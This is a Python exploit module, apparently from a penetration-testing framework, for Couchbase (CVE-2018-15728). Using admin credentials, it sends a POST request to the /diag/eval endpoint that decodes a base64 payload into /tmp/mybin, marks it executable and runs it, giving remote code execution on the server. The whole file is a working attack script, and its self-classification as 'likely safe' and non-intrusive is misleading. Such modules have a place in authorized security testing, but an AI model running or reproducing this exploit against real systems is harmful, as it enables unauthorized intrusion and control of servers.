#!/usr/bin/env python3
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.

from lib.module.exploit import ExploitClass
from lib.module import payload
from lib.module.safety import Safety
from lib.module.intrusiveness import Intrusiveness

import base64

class ExploitModule(ExploitClass):
    def __init__(self):
        super().__init__(**{
            'Name': 'Couchbase RCE',
            'Description': """
                With a valid username and password to an admin-account, the
                attacker can get a remote shell on the machine.
            """,
            'Options': ["USERNAME", "USERPASS"],
            'Ports': [8109],
            'payload': {
                "arch": payload.ARCH_LINUX_X86,
                "badchars": ""
            },
            'CVE': 'CVE-2018-15728',
            'classification': (Safety.LIKELY_SAFE, Intrusiveness.NONE),
            'products':[
                {"product":"Couchbase"}
            ]
        })

    def exploit_code(self, payload):
        pl = payload.encoded()
        if isinstance(pl, str):
            pl = pl.encode()
        b64 = base64.b64encode(pl)
        b64 = b64.decode("utf-8")
        data = """
var username = ${USERNAME};
var pass = ${USERPASS};
Network.request_sd("POST", "/diag/eval", 'os:cmd("echo """ + b64 + """|base64 -d>/tmp/mybin&&chmod +x /tmp/mybin&&/tmp/mybin")', console.log, username, pass);
"""
        return data
